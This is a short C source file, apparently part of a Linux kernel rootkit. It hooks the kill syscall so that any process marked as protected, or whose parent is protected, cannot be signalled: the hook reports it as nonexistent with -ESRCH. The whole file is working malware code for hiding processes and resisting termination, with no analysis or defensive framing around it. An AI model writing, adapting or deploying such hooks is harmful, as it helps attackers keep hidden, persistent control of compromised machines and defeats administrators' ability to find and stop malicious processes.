#include "../inc/hook.h"
#include "../inc/cmds.h"
#include "../inc/util.h"

syscall_t *_kill = NULL;

asmlinkage int64_t h_kill(const struct pt_regs *r) {
  orig_get(_kill, "kill");

  // this also checks if the process' parent is protected
  if(cmd_protect_is_protected((pid_t)r->di))
    return -ESRCH; // nah bro trust me it doesnt exist

  orig_call(_kill);
}
